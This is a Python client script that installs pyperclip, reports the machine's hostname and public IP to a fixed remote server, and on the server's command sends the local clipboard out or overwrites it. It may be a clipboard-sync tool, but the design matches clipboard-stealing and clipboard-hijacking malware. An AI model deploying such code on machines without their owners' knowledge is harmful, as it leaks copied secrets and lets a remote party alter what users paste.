from os import system

system("pip install pyperclip")

from socket import socket
from socket import gethostname
from socket import AF_INET
from socket import SOCK_STREAM
from requests import get
from json import dumps
from json import loads
from gzip import compress
from gzip import decompress
from base64 import b64encode
from base64 import b64decode
from pyperclip import paste
from pyperclip import copy
from _thread import start_new_thread as s
from time import time as timex
from time import sleep

realip = "can't get"
hostname = "can't get"

try:
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.77"}

    rs = get(url="https://api.ip.sb/ip", headers=headers)
    realip = rs.text.replace("\n", "")

    hostname = str(gethostname())
except:
    print("can't get something")

print(hostname, realip)

heartpockettime = 5
host = 'home.olcdn.xyz'
port = 8876
pocket_size = 4096
addr = (host, port)

myid = ""
connecton = False


# 13位时间戳 支持给定时间
def milliTime(time=None):
    if time is None:
        time = timex()
    return int(round(time, 4) * 1000)


def heartpocketth(tcpCliSock):
    while connecton:
        payload = {
            "id": myid,
            "cmd": "heartpocket",
            "data": str(milliTime())
        }
        payload = compress(b64encode(dumps(payload).encode("utf8")), 9)
        tcpCliSock.send(payload)
        print("sendpocket")
        sleep(5)


while True:
    try:
        tcpCliSock = socket(AF_INET, SOCK_STREAM)
        while True:
            try:
                tcpCliSock.connect(addr)
                print("connected tcp")
                payload = {
                    "hostname": b64encode(hostname.encode("utf8")).decode("utf8"),
                    "ip": b64encode(realip.encode("utf8")).decode("utf8")
                }
                payload = compress(b64encode(dumps(payload).encode("utf8")), 9)
                tcpCliSock.send(payload)
                data = tcpCliSock.recv(pocket_size)
                data = loads(b64decode(decompress(data)))
                if data['cl'] == "ok":
                    myid = data['id']
                payload = {
                    "id": myid,
                    "cl": "ok"
                }
                payload = compress(b64encode(dumps(payload).encode("utf8")), 9)
                tcpCliSock.send(payload)
                print("connected server ok")
                connecton = True
                s(heartpocketth, (tcpCliSock,))
            except:
                connecton = False
                continue
            while True:
                data = tcpCliSock.recv(pocket_size)
                try:
                    data = loads(b64decode(decompress(data)))
                except:
                    print("LoadPocket ERROR")
                    continue
                if data['id'] == myid:
                    print("get cmd: " + data['cmd'])
                    if data['cmd'] == "exit":
                        exit()
                    if data['cmd'] == "reconnect":
                        break
                    if data['cmd'] == "tocopyb64":
                        copydata = b64decode(str(data['data']).encode("utf8")).decode("utf8")
                        print("copy data : " + copydata)
                        try:
                            copy(copydata)
                        except Exception as error:
                            print("copy data error C: " + str(error))
                    if data['cmd'] == "tocopy":
                        copydata = str(data['data'])
                        print("copy data : " + copydata)
                        try:
                            copy(copydata)
                        except Exception as error:
                            print("copy data error C: " + str(error))
                    if data['cmd'] == "getcopy":
                        pushdata = paste()
                        print("Getcopy Ask And will push : " + pushdata)
                        pushdata = b64encode(str(pushdata).encode("utf8")).decode("utf8")
                        payload = {
                            "id": myid,
                            "cmd": "pushcopy",
                            "data": pushdata
                        }
                        payload = compress(b64encode(dumps(payload).encode("utf8")), 9)
                        try:
                            tcpCliSock.send(payload)
                        except:
                            print("send push copy error")
                else:
                    print("get ok pocket but id no match myid:" + myid + " pocketid:" + data['id'])
    except Exception as error:
        print("Recv ERROR C :" + str(error))
        connecton = False
